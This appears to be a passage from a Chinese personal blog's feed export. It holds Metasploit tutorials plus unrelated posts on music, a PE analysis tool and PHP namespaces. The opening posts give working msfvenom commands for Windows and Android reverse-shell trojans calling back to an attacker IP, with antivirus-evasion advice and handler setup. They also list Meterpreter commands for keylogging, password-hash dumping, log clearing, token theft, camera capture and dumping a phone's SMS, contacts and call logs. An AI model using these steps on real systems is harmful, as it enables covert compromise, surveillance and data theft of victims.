<p>以上就是基本命令，解释一下，-p后面是payload名称，然后是你的ip和端口(payload参数)，然后是-f 格式，由于是实验就先设置exe，然后-o payload.exe指保存为payload.exe。当然，实验的时候可以把格式设置成exe，但是实战的时候毕竟有杀毒软件，所以格式最好是jar，jar就要求对方有java环境，可以用来拿java web网站的时候使用，或者设置成python然后自行shellcode免杀，即用Python容器，然后用AES混淆Python代码，再用pyinstaller编译exe，这是目前最完美的过杀毒软件方案，就连勒索软件都不会被杀毒软件干掉，除非有特殊动作，比如修改注册表。当然，楼主还有很多要学习。</p>
<p>具体步骤如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=44444 -f exe -o test.exe            </span><br></pre></td></tr></table></figure>
<p>–&gt;在当前目录下生成木马程序test.exe，PS：生成payload.exe不会被杀，test.exe被秒杀</p>
<p>PS:之后的操作步骤是和上面的一样的↓</p>
<p>之后在metasploit下连接后门程序，步骤如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole                  --&gt;开启metasploit</span><br><span class="line">use exploit/multi/handler       --&gt;使用“exploit/multi/handler”这个模块连接后门程序</span><br><span class="line">show options   --&gt;查看需要设置的配置信息//这里其实不需要配置任何信息的</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp    --&gt;使用tcp反向连接</span><br><span class="line">show options               --&gt;查看需要设置的配置信息</span><br><span class="line"><span class="built_in">set</span> LHOST=192.168.2.146    --&gt;设置我们攻击者自己的连接IP</span><br><span class="line"><span class="built_in">set</span> LPORT=44444            --&gt;设置我们攻击浙自己的连接端口</span><br><span class="line">exploit                    --&gt;执行连接，等待木马执行后连接</span><br></pre></td></tr></table></figure>

<p>PS：远程木马被执行后接着可以直接“shell”命令拿下shell</p>
<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>OK，完成了！<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msfvenom</tag>
        <tag>远程木马攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit工具Meterpreter的命令速查表</title>
    <url>/post/Metasploit2/</url>
    <content><![CDATA[<p>&amp;nbsp;<br>&amp;nbsp;</p>
<h4 id="msfpayload反弹shell使用的一些命令集"><a href="#msfpayload反弹shell使用的一些命令集" class="headerlink" title="msfpayload反弹shell使用的一些命令集"></a><font face="楷体">msfpayload反弹shell使用的一些命令集</font></h4><p>&amp;nbsp;</p>
<h5 id="一、核心命令-–-帮助菜单"><a href="#一、核心命令-–-帮助菜单" class="headerlink" title="一、核心命令 – 帮助菜单"></a>一、核心命令 – 帮助菜单<font face="Arail"></h5><blockquote>
<blockquote>
<p><font color="#dd0000">background</font> – 将当前会话移动到背景变成一个session，当再次使用时再用sessions -i ID调用<br>bgkill – 杀死一个背景 meterpreter 脚本<br>bglist – 提供所有正在运行的后台脚本的列表<br>bgrun – 作为一个后台线程运行脚本<br>channel – 显示活动频道<br>close – 关闭通道<br>exit – 终止 meterpreter 会话<br>help – 帮助菜单<br>interact – 与通道进行交互<br>irb – 进入 Ruby 脚本模式<br><font color="#dd0000">migrate</font> – 移动到一个指定的 PID 的活动进程<br>quit – 终止 meterpreter 会话<br>read – 从通道读取数据<br><font color="#dd0000">run</font> – 执行以后它选定的 meterpreter 脚本<br>use – 加载 meterpreter 的扩展<br>write – 将数据写入到一个通道<br></font></p>
</blockquote>
</blockquote>
<h4 id="二、文件系统命令"><a href="#二、文件系统命令" class="headerlink" title="二、文件系统命令"></a><font color="#dd0000">二、文件系统命令</font><font face="Arail"></h4><blockquote>
<blockquote>
<p>cat -读取并输出到标准输出文件的内容<br>cd -更改目录对受害人<br>del -删除文件对受害人<br>download-从受害者系统文件下载<br>edit-用 vim编辑文件<br>getlwd -打印本地目录<br>getwd -打印工作目录<br>lcd -更改本地目录<br>lpwd -打印本地目录<br>ls -列出在当前目录中的文件列表<br>mkdir -在受害者系统上的创建目录<br>pwd -输出工作目录<br>rm -删除文件<br>rmdir -受害者系统上删除目录<br>upload-从攻击者的系统往受害者系统上传文件<br></font></p>
</blockquote>
</blockquote>
<h4 id="三、网络命令"><a href="#三、网络命令" class="headerlink" title="三、网络命令"></a>三、网络命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>portfwd -端口转发<br>route -查看或修改受害者路由表<br></font></p>
</blockquote>
</blockquote>
<h4 id="四、系统命令"><a href="#四、系统命令" class="headerlink" title="四、系统命令"></a>四、系统命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>clearav -清除了受害者的计算机上的事件日志<br>drop_token -被盗的令牌<br>execute-执行命令<br>getpid -获取当前进程 ID (PID)<br>getprivs -尽可能获取尽可能多的特权<br>getuid -获取作为运行服务器的用户<br>kill -终止指定 PID 的进程<br><font color="#dd0000">ps</font> -列出正在运行的进程<br>reboot-重新启动受害人的计算机<br>reg -与受害人的注册表进行交互<br>rev2self -在受害者机器上调用 RevertToSelf()<br><font color="#dd0000">shell</font> -在受害者计算机上打开一个shell<br>shutdown-关闭了受害者的计算机<br>steal_token -试图窃取指定的 (PID) 进程的令牌<br>sysinfo -获取有关受害者计算机操作系统和名称等的详细信息<br></font></p>
</blockquote>
</blockquote>
<h5 id="五、用户界面命令"><a href="#五、用户界面命令" class="headerlink" title="五、用户界面命令"></a>五、用户界面命令<font face="Arail"></h5><blockquote>
<blockquote>
<p>enumdesktops -列出所有可访问台式机<br>getdesktop -获取当前的 meterpreter 桌面<br>idletime -检查长时间以来，受害者系统空闲进程<br>keyscan_dump -键盘记录软件的内容转储<br>keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件<br>keyscan_stop -停止键盘记录软件<br>screenshot-抓去 meterpreter 桌面的屏幕截图<br>set_desktop -更改 meterpreter 桌面<br>uictl -启用用户界面组件的一些控件<br></font></p>
</blockquote>
</blockquote>
<h4 id="六、特权升级命令"><a href="#六、特权升级命令" class="headerlink" title="六、特权升级命令"></a>六、特权升级命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>getsystem -获得系统管理员权限<br></font></p>
</blockquote>
</blockquote>
<h4 id="七、密码转储命令"><a href="#七、密码转储命令" class="headerlink" title="七、密码转储命令"></a>七、密码转储命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>hashdump -抓去哈希密码 (SAM) 文件中的值<br></font></p>
</blockquote>
</blockquote>
<h4 id="八、Timestomp-命令"><a href="#八、Timestomp-命令" class="headerlink" title="八、Timestomp 命令"></a>八、Timestomp 命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>timestomp -操作修改，访问，并创建一个文件的属性<br></font></p>
</blockquote>
</blockquote>
<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>远程木马攻击</tag>
        <tag>Meterpreter命令</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之渗透安卓实战</title>
    <url>/post/Metasploit3/</url>
    <content><![CDATA[<p>&amp;nbsp;<br>&amp;nbsp;</p>
<h4 id="Metasploit之渗透安卓实战"><a href="#Metasploit之渗透安卓实战" class="headerlink" title="Metasploit之渗透安卓实战"></a><font face="楷体">Metasploit之渗透安卓实战</font></h4><table><tr><td bgcolor=#D1EEEE>&emsp;在之前的Metaspoloit使用中都是在Windows系统中，因为渗透的是Windows系统，所以选用了“windows/meterpreter/reverse_tcp”模块。
而这里需要渗透安卓系统了，就选用“android/meterpreter/reverse_tcp”模块。
那么对于kali-linux连接木马的方式还是和之前的一样，利用“exploit/multi/handler”
并且，同样需要选用“windows/meterpreter/reverse_tcp”的PAYLOAD
这里假设我的测试环境
kali-linux：  192.168.2.146
安卓模拟环境：192.168.2.107</td></tr></table>

<p>&amp;nbsp;</p>
<h5 id="一、生成远程安卓木马"><a href="#一、生成远程安卓木马" class="headerlink" title="一、生成远程安卓木马"></a><font face="楷体">一、生成远程安卓木马</font></h5><table><tr><td bgcolor=#D1EEEE><font color="#dd0000">msfconsole
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=4444 R > payload.apk</font></td></tr></table>

<blockquote>
<blockquote>
<p>命令解析：<br>p 设置要使用的payload<br>LHOST 设置用来接收反弹连接的主机（kali-linux的IP）<br>LPORT 设置用来接收反弹连接的端口（kali-linux的端口）<br>R 设置文件格式<br>Location 要保存的文件位置–&gt;&#x2F;root&#x2F;Desktop&#x2F;是桌面，没有目录表示当前系统Home目录下<br>PS：对于目前的安卓系统安全机制的考虑，因为没有签名证书可能导致无法安装或易被受害者识破<br>那么，签名证书的制作可以查看参考文献资料</p>
</blockquote>
</blockquote>
<p>&amp;nbsp;</p>
<h5 id="二、开启metasploit，并且开启相关连接"><a href="#二、开启metasploit，并且开启相关连接" class="headerlink" title="二、开启metasploit，并且开启相关连接"></a><font face="楷体">二、开启metasploit，并且开启相关连接</font></h5><table><tr><td bgcolor=#D1EEEE><font color="#dd0000">msfconsole
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.2.146
set LPORT 4444
exploit</font></td></tr></table>

<p>&amp;nbsp;</p>
<h5 id="三、meterpreter连接"><a href="#三、meterpreter连接" class="headerlink" title="三、meterpreter连接"></a><font face="楷体">三、meterpreter连接</font></h5><p><font face="楷体">&amp;emsp;安卓手机安装并且打开木马后会返回我们一个meterpreter连接,那么我们可以使用以下的一些常用的命令:</font></p>
<table><tr><td bgcolor=#D1EEEE><font color="#dd0000">cd               -->目录切换，命令：cd /  切换到根目录
search           -->搜索文件，命令：search text.jpg
download         -->下载文件，命令：download test.jpg
webcam_list      -->查看摄像头列表，因为手机都是前置和后置摄像头了
webcam_snap      -->拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1
webcam_stream    -->开启摄像头视频监控，同上，命令：webcam_stream -i 1</font>
<font color="#dd0000">安卓系统相关命令：
check_root       -->查看当前安卓是否已经root
dump_calllog     -->下载通话记录
dump_contacts    -->下载短信记录
dump_sms         -->下载通讯录
geolocate        -->利用谷歌地图定位（需要安装谷歌地图）</font></td></tr></table>

<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>远程木马攻击</tag>
        <tag>安卓渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Music-Collection</title>
    <url>/post/Music-Collection/</url>
    <content><![CDATA[<p>&amp;nbsp;</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=730 height=550 src="//music.163.com/outchain/player?type=0&id=692893521&auto=0&height=500"></iframe>

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=730 height=450 src="//music.163.com/outchain/player?type=0&id=2197936899&auto=0&height=430"></iframe>

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=730 height=450 src="//music.163.com/outchain/player?type=0&id=2527477789&auto=0&height=430"></iframe>

]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>Network attack and defense</title>
    <url>/post/Network-attack-and-defense/</url>
    <content><![CDATA[<p>(〃￣︶￣)人(￣︶￣〃)</p>
<span id="more"></span>


<br />
<br />




<div class="pdfobject-container" data-target="/pdf/网络攻防实验报告.pdf" data-height="500px"></div>]]></content>
      <categories>
        <category>Network-Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全复习笔记</title>
    <url>/post/Network-security/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="04670f5341627d1d4215b2d0d3bb32d65366591e45dd2230a31e6c4f67345ae7">f2cb6dad3997b265c98f36a97452129cc092e92f124168e062928c4d9cb8fadc7265a9453afb07faedd95f601f88b5ed1bd43ebf6a32fa660dd566db7277d9b5f47eafc10b48d1d4a9e68cd299b324bf9e6ee7ea80ef212afb16080ae73e61ded4e94af719d6f3767a6533129c1ef7d6f8e66a3216597039beb0a827132dbd3b31fb66effeda05b251f69e3b46b28715118c35fd6ca9f5083b1e7a42522515759f2169c295a2dde3990be1b28c4bb2e027e33f4e493529757861890b881ed7636964bff2aa712677550fb5f4a14a263dcf074101c072cdc6b96336a8c759faa77b3811ddf2b7cc1eb1d011d6c468c7279711e7736170e86d0a4cb33c8f95c7f51eb8f69cc3ff2ee1be4e0e62d70e77b4b241f0c76c601ebd242fc057a18fe3fdab9336166c80c6509516f4651ca77f2e24b49e52f9a1a6545fc0f55a05e0bc4025f158d11a676f0bdceb49b9973aea5605ba1c8d8911d3068b426dff9cefce08505b9db67b849f1113de6352b13fe4b963e5bbc88bcbb03d32e58ceba8273c6e9b5ba70dd181ef7041263d9ce77e76be6de8ce80b21fdbf666c91a42e890536a488504f4d99d4aafd08ac5fecf3c0deecdba261652f4780cd6baa2924ed21eca875ad73d8be7d4ba0cd02312df1df79b0df614571c121ce9d5c57fd85f06bf26cb46c92e4bfcde8cda7321a5741b16e4f9f99705053e0e8d6c8c6de10827ce92fb256ce2c1e8d8a260f2487f4cec48c70ee7f0e06c02e3629f6e881cf5cc7fb2662b7c721f1a04375d15a603287c5a7ce5ea3c4a68367314b63c913d6a16d84829fcd64f5afcac2b69e8fc791382ef3fc9a8302ddc47911474054cc647c01e492e4131872e49312d7db37ea1ab1b8babe47bd11306faf9def7c2c3d510a767abea8a79a24086af4756ee7af1053b72aba3c3c6976cb5b64a4e2d64ad2a80dd6da6ca3e7e9dfe3efdcc2081f335b3838765f441e8ede615b2bbaf6b1a71993058fc4eda3f82e50aea5686b8b4080a0f853e4dd9cf756ec40de4b7c15f7d25e00c0cce89934471dbdc03b6c792a1ef1cacbc43368c939ebb76f0030aec4ac9da38e120597505d3e870b27deb2651f3825e98b7f4041d6993e0a89acfb903ff23880c16a68357a9d241ecffa3d486cbb81257dccd8558142dc9cdc2264250f4b1982117c132714a3fccb9d6a573b93963e9022abdbc9ab839213fe013e0a32988b5b20e0221e08cf643a9b9db9db7686ecfbd87b6b0ba30ce64dbee0b4db191f85beb1ca38a851a9669f8f580307147d29cf9d384f594b8531e6ef3f7ae045c69a91a47f91295ed29c904d5ea881284cf7277ca1e689bc84c29ffb371431c79aef45e652d50886017f9dd43fc6e7b865bdf115268f7e0a0ec68002f69af0a86fa0ebf8a6992fb2c62dbe25fd2d3b901ef177a649207e8a83b75e49a5e38f0150eef58c12a884767f23eb156b87f5fd5b831f7d95178eed25c1eafc54fbd997be64357196bed80626fda49fe00a0ce00316341ca5d184ed0191215023ea7d41601fb2a61e63cf48f63d552d039501018983bff3daca827b8faf70a4105b0a88181fd3e7c963d5873b2a0711ac67e3f20cc5ffd6aa1bf0d15a7cd76571d43301b882123cdd155ff4726cb9a53d30023282b419627e1962f6afd2574cacd0168388ba6f710cbd1cd853f7cd17dc35dc92147fb2c360684f37d39d0a8c726dab30757bcc10045654fd0bb25a02b320ff0d2585ed77a33fc481bde3c19dfb206a7fb7054159be8069423afbbad8d9ab9eaf74d9a61b865fe6d00ce79355e0c751f266a5c61b69beec49795670c8ef044e718d47dad42556b4580053fab6dd72642fc5c925d5759cb7820294fac104eba496b4fc21b0d4d16f30f3a4e508360344b05856b5192a9fb57236185bbf8c79c34377dea6fdde82ecdf72bed209f0bb746441f5b1d630d2d5db2e79c30f3e9e38e284a72dcfd30742e1157d42f584a6ddc05cacc84c4982ce745e3e843e72163f6709b8ada02a34bfe4196d6986a9bf8ab29127702bc4c80f506bdccb9f05c53af9516602f03ef3e31238f9be670cfb71c5715a0ca96e12a261e733d79a2e59cc0dc2169f260117dc5beccd61dfb48c058430d8d31d9aa4154eb952f31c1324781e64693684d9ee5e127d1589de1eb20fbca319f643282f1a6dd43d01a0b32b075724d976c38c09e87f72a68ef91658fd03f9667816be4f6f5ca2f045f560e99b2211520739812edf046523c2ae7f6bdc3026dccb8eed9d73c3f79e2b2a64fbb735433574c346a5332323f47643173d1df2015aeb1e1acd06950209f565f68b91ca910722328c33ebce3295a74dd2943649fbb8df90e92123aedd24e54b40aaeaac02a85b424221589c051b360ede7ae77ccef702df03d807f229e285e25b44c76bfdba0a0d8591e10f5654a476cb42491c594843942cc2dd872fb567db22e38d7908054f3100ede08f4ad0747d04302a0675b7798158521385250a1cb1ca59ce487b278be04179f06a18566d8de4fe198eac7ac3caec185cbfab4cb2a72bc3a8659d704925d53142222af52cb22b2866b03119cdc7faa349bdb0763466d0f9b4e5796765850f6dc76644cfc08261b4d33cb445c534900ecd5f85fd935d50dde5b01e00346f34334bffa50fc06fcc3538baf4fdacdedc5b682d35d7a996b8f0e4971bef5a0e413dd7f6eb9f60a4cb6e92563db70a37ab3a835378074cb4338bc1d3de462a47beca0244f38b2a1b4fc9a3edc3b796afb4a1d243e434f335c29f4b51b1c4e1d956fb87aa526de44ed5403e8df1c3bef585324fa66d1ddef9266c019d1cc1c0fb88fc6cfe501220e105d72d891200452e181a4ab4f63b229f3fc63028b14556d8597b6e255c567562e3da9c0bf731f4387b546055fc57cd8f0c9701847a378b7be3ae46c90913649bf6a45c82b4def7f6f143af4af187a489dd5c032e08e25eb121267a69e10de209d2b4cd7398da14465779aad96e650faaddd7603ab2aeee6f9b12a57249622ba26c8befa700595be9c286722738bd1d47e8ba95aca359e86688908fff409d3bc2fdf86bcfcf5078fb67f83df583f95ef1412bf9d65395d287dec3f78a1008fc022a391fb11be74461a6088746d54624da6b6b77743d63c08cbedbe1210a10b1999dafdd487900edb2fff6dbe994c8d926c50197521b6448ca09032f018d2ac4aab310ae877c17d5c4f948f92ba387c7ad194ac6b9fbdc884d3b08a40083e955a8a792edbf87ee9db47da23b921a227bae4e63003849577ed4175b30f3805eafc30393a218061c2f3330bbf58ccb9ff0807b7df9432c7a69b1ac1d9f5839c276a2775e0278ee8ae4820fe9d994a6b530ef5d670026610b4cee086c8ed5ecad3d234f9c33a0fbe20c08b4bd34b729a6b9a4a60c6732e4f7c3b2b6c033a7dfe99432aaebb9286c0f877adeaa166a840353673c0640032c9b688c3ecda73b2e6c5b40c98059b87bdbbd876dcd3868f9da0f2930c53f6101223f10284aa7017652f82e065503ab88c47fec47c9e478cd237c9b6e09264381a51bba2071c98e9309107e6de9a2abe81661c13d6158ee4bea50ce6a222c9ad99827930b2717922e6913a67fca9e8f78a99476dde0ae4ff7b252f3163de25e0d4795bbdaa87bce37224c4e953dbd4b80b867ab67d36cd5a631c9d6d7fa3312fd0cbc0dc1dc49385942cbb9438c9a324352366799ace5cb5890e77bae9435352bdf49937631bd56d4901c4dad07a02789f2fa665f575c9bfcb954f68603aa3e439cd9cea1a58b4d8b05bed63b2beec949c286a99a199c8dffcf7b4b512cd3bc883bb86affaf9389a7b0c29485d9e609aaccb39b03e446ae9e54b5bc075982092befed93b0686a1f3a88746f14ead8b550644957e4f781e61bdc092dcf977977ccbeec87458e080d743a075bc03b62ff30faa6504e6128013ec939902b6e8b4f256ca96c46761a58f143bc833b08d5cb4712930eb8fb29586eb1a7c6dbac13fbb6f86d2c04e329136154c19028f37a01bcf1c1e97900edb717088d7cf58a128da1e46b683d24a49bfa3b2259ac5577141297a09c6507e47ac02e3322dfd9169ce746d68ed0d52a2b70c317480bffff952c9410ded3bc3ae4f8f06763b691e7f48874b5c4668ee510cb27a448e0ea18c7e7fd7272ecb4f17225f739f99a6a756fd0d4dfddfb4a1a34e7870327e16d79791c2e075401ba8220905bfa5cccad200f9782fcdb7498dc5e896797d090fc2491bfa474193e2e64eec182a58d542bbc8bc5f9de4b742875544e28551d6c93a282f847fc2d3e8fa02530f1154345579b3a3eadcb5c1918e815047ed69e73236f3f6fbfe6acbef7d9647cf49df8ffbd06f200d9026707445b557c7181149263c9fee4ec87132245948bbcde1b914efcd4f044b41b7568e016e15907c85a84ee25788db9ed6a5c727707e76e3f9a29b6a53e5aeb74f7e49a018f857de90069067b6f90d24c951e2584c76ff1a689347ba8d2689b452085366b9b3a6b7e255d4c27ab4ac60fd3fcab585199cb39d4a0649d160d6a3ce518316bc21470160fd1b5daf1147f941d58abda29995c4d14d684035345ce3a943eae00d6b9092fdcfbc5a748e79ee7fbe672c1d2b18d41d300859befa97cf0e5940d6b2551fcb1e4416f5362b9937d0553776ed7cd82bec36a70978562045cb18553636075e4cce58bc9b41acc2cad557be3bb70ac2c98467c92cd711fb045692183f335310f95fffb1d07e7ca631d5c06f3087b008f4cf21a9f49ce78351c92324e14060edfe093836389ff9658107428d6ea6006f501a452d8a447176fee10bffb6f21243a00a0aaf0e90d8bdc51492d5aa5ed0185785ecae5e1df4aea7cdc4f789af1b07c5962a16ed2a8c71c3a20bc18f1c7a5c5a37dea48eb2263db2ecf53390ade6c6b8e11d1f42a170b01b70d68e937273bbb2a35939d02b8af74d5145f96b319f38d70e011f7468b7f1cf7119d60e1f0690c2dd27e7e6816401049139f6f65a0d71655a0da9c3182adcc847a17b48dff51100d6bfb9abe4b34cc60664122c1dab1cd4c2067211c2d84be9da7f0b91ff85f1821669881ad4a792412ae6673e3e2697e018219079acec1d04c1a4d1d15b93077143b929aca7517ef61361f6f5b6636711443046302088bc8f8c45cab1bc3b7e1b890cd8c285fcc55b2e3d9b4f448c1e352d3b88eb03703eb2ffb3dc67af3abaef5f150182dc088f6b9aa8269b45abd5d6253e372068dd59d7c5b3369c9d3e1755532c7eab9e9fb7c86e9dca24075c52a99ff56c4727997d21b0b0877e60258168646ff040ed845261b2ed4142bbbdfa4f047a88138f8c663698aed0e2a2aa72e8ae3625725c1bce2eb9b34ab3feb79338d701e67e70ce3747</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>安全笔记</tag>
        <tag>安全指导</tag>
      </tags>
  </entry>
  <entry>
    <title>PE 文件解析及利用工具</title>
    <url>/post/PEView-Tool/</url>
    <content><![CDATA[<p>😄</p>
<span id="more"></span>

<p>（本文包含多张图片，加载较慢，建议挂上VPN或多刷新几次）</p>
<p>为了方便分析恶意样本，自制一些功能，加上对程序进行保护，写了本工具。</p>
<p>工具支持 x86、x64 Windows 平台下可执行文件的解析。</p>
<p>代码量不小，部分功能仍需完善，暂时不计划开源。部分代码如下，包含 C、汇编代码、裸函数使用。</p>
<p><img data-src="https://s2.loli.net/2023/02/25/S1EuabJBwWc9oAq.png" alt="1.png"></p>
<p><img data-src="https://s2.loli.net/2023/02/25/IuBcRsWofmlv3NJ.png" alt="2.png"></p>
<p><img data-src="https://s2.loli.net/2023/02/25/z7wVjCDgyqXsY8e.png" alt="3.png"></p>
<h2 id="1-功能介绍"><a href="#1-功能介绍" class="headerlink" title="1 功能介绍"></a>1 功能介绍</h2><p>工具包涵两个程序，分别是：PE解析及利用工具、特征码提取工具。</p>
<p><img data-src="https://s2.loli.net/2023/02/25/uO2JEx9seYQlTGy.png" alt="5.png"></p>
<h3 id="1-1-版本信息"><a href="#1-1-版本信息" class="headerlink" title="1.1 版本信息"></a>1.1 版本信息</h3><p><img data-src="https://s2.loli.net/2023/02/25/skNStP8XnLVGeMJ.png" alt="4.png"></p>
<h3 id="1-2-PE-信息查看"><a href="#1-2-PE-信息查看" class="headerlink" title="1.2 PE 信息查看"></a>1.2 PE 信息查看</h3><p>能根据识别到的 PE 信息展示可执行文件的路径、执行平台等。</p>
<p><img data-src="https://s2.loli.net/2023/02/25/eI5fHMxwV2Y1GpN.png" alt="6.png"></p>
<h4 id="1-2-1-区段信息"><a href="#1-2-1-区段信息" class="headerlink" title="1.2.1 区段信息"></a>1.2.1 区段信息</h4><p><img data-src="https://s2.loli.net/2023/02/25/7qhWgNB9cRkpmfQ.png" alt="7.png"></p>
<h4 id="1-2-2-数据目录表"><a href="#1-2-2-数据目录表" class="headerlink" title="1.2.2 数据目录表"></a>1.2.2 数据目录表</h4><p><img data-src="https://s2.loli.net/2023/02/25/yhH2xtEmWFNBZMw.png" alt="8.png"></p>
<h4 id="1-2-3-文件偏移-内存偏移转换功能"><a href="#1-2-3-文件偏移-内存偏移转换功能" class="headerlink" title="1.2.3 文件偏移-内存偏移转换功能"></a>1.2.3 文件偏移-内存偏移转换功能</h4><p><img data-src="https://s2.loli.net/2023/02/25/IeRCmKt3SkzAGv6.png" alt="9.png"></p>
<h3 id="1-3-软件加壳"><a href="#1-3-软件加壳" class="headerlink" title="1.3 软件加壳"></a>1.3 软件加壳</h3><p><img data-src="https://s2.loli.net/2023/02/25/avP7Qy2FswOYJHx.png" alt="10.png"></p>
<h3 id="1-4-注入功能"><a href="#1-4-注入功能" class="headerlink" title="1.4 注入功能"></a>1.4 注入功能</h3><p><img data-src="https://s2.loli.net/2023/02/25/GDUdmnVkqg4wfWY.png" alt="11.png"></p>
<h3 id="1-5-进程监控功能"><a href="#1-5-进程监控功能" class="headerlink" title="1.5 进程监控功能"></a>1.5 进程监控功能</h3><p><img data-src="https://s2.loli.net/2023/02/25/2rDkdBYlZmQTfbx.png" alt="12.png"></p>
<h2 id="2-特征码提取工具"><a href="#2-特征码提取工具" class="headerlink" title="2 特征码提取工具"></a>2 特征码提取工具</h2><p><img data-src="https://s2.loli.net/2023/02/25/lhnaO6fwSPp9Wbv.png" alt="13.png"></p>
]]></content>
      <categories>
        <category>PE 文件解析</category>
      </categories>
      <tags>
        <tag>Windows应用层</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-命名空间</title>
    <url>/post/PHP-namespace/</url>
    <content><![CDATA[<p>(oﾟvﾟ)ノ</p>
<span id="more"></span>

<blockquote>
<blockquote>
<p><font color="red">如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间</font>，与 PHP 引入命名空间概念前一样。在名称前加上前缀 \ 表示该名称是全局空间中的名称，即使该名称位于其它的命名空间中时也是如此。对于函数和常量来说，如果当前命名空间中不存在该函数或常量，PHP 会退而使用全局空间中的函数或常量。</p>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<p><font color="#00B2EE"><strong>名称解析遵循下列规则：</strong></font></p>
</blockquote>
</blockquote>
<ol>
<li>对完全限定名称的函数，类和常量的调用在编译时解析。例如 new \A\B 解析为类 A\B。</li>
<li>所有的非限定名称和限定名称（非完全限定名称）根据当前的导入规则在编译时进行转换。例如，如果命名空间 A\B\C 被导入为 C，那么对 C\D\e() 的调用就会被转换为 A\B\C\D\e()。</li>
<li>在命名空间内部，所有的没有根据导入规则转换的限定名称均会在其前面加上当前的命名空间名称。例如，在命名空间 A\B 内部调用C\D\e()，则 C\D\e() 会被转换为 A\B\C\D\e() 。</li>
<li>非限定类名根据当前的导入规则在编译时转换（用全名代替短的导入名称）。例如，如果命名空间 A\B\C 导入为C，则 new C() 被转换为 new A\B\C() 。</li>
<li>在命名空间内部（例如A\B），对非限定名称的函数调用是在运行时解析的。例如对函数 foo() 的调用是这样解析的：<br>(1). 在当前命名空间中查找名为 A\B\foo() 的函数<br>(2). 尝试查找并调用 全局(global) 空间中的函数 foo()。</li>
<li>在命名空间（例如A\B）内部对非限定名称或限定名称类（非完全限定名称）的调用是在运行时解析的。下面是调用 new C() 及 new D\E() 的解析过程： new C()的解析:<br>(1). 在当前命名空间中查找A\B\C类。<br>(2). 尝试自动装载类A\B\C。<blockquote>
<blockquote>
<p><font color="red">new D\E()的解析:</font><br>(1). 在类名称前面加上当前命名空间名称变成：A\B\D\E，然后查找该类。<br>(2). 尝试自动装载类 A\B\D\E。<br>为了引用全局命名空间中的全局类，必须使用完全限定名称 new \C()。</p>
</blockquote>
</blockquote>
</li>
</ol>
<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;</p>
<p><font face="Comic sans MS">对于命名空间，官方文档已经说得很详细<font color="red">[<a href="http://www.php.net/manual/zh/language.namespaces.rationale.php">查看</a>]</font>，我在这里做了一下实践和总结。<br><font color="red">命名空间一个最明确的目的就是解决<strong>重名问题</strong></font>，PHP中不允许两个函数或者类出现相同的名字，否则会产生一个致命的错误。这种情况下只要避免命名重复就可以解决，<font color="red">最常见的一种做法是约定一个前缀</font>。</p>
<p>例：项目中有两个模块：article和message board，它们各自有一个处理用户留言的类Comment。之后我可能想要增加对所有用户留言的一些信息统计功能，比如说我想得到所有留言的数量。这时候调用它们Comment提供的方法是很好的做法，但是同时引入各自的Comment类显然是不行的，代码会出错，在另一个地方重写任何一个Comment也会降低维护性。那这时只能重构类名，我约定了一个命名规则，在类名前面加上模块名，像这样：Article_Comment、MessageBoard_Comment</p>
<p>可以看到，名字变得很长，那意味着以后使用Comment的时候会写上更多的代码（至少字符多了）。并且，以后如果要对各个模块增加更多的一些整合功能，或者是互相调用，发生重名的时候就需要重构名字。当然在项目开始的时候就注意到这个问题，并规定命名规则就能很好的避免这个问题。<font color="red">另一个解决方法可以考虑使用命名空间。</font></p>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>注明：</strong></font><br>本文提到的常量：PHP5.3开始const关键字可以用在类的外部。const和define都是用来声明常量的（它们的区别不详述），<font color="red">但是在命名空间里，define的作用是全局的，而const则作用于当前空间。</font>我在文中提到的常量是指使用const声明的常量。</p>
